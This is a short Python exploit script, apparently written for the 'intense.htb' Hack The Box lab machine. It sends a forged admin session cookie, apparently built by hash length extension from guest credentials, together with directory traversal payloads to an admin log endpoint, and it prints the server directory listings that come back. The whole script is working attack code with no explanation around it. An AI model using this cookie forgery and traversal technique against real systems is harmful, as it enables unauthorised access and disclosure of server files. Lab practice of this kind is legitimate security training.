import requests

cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.4MLooEVtdN4kyfXjuC2xC9a2tnflPcBTA/Cbw741heM="
#url = "http://intense.htb/admin/log/view"
url = "http://intense.htb/admin/log/dir"
cookies = dict(auth=cookie)

while(True):
    t = input()
    t.strip()
    payload = {'logdir': "../../../../../../../../../../"+t}
    response = requests.post(url, data=payload,cookies=cookies)
    ret = (response.text)
    files = ret.split(',')
    for x in files:
        print(x)
    print(payload)
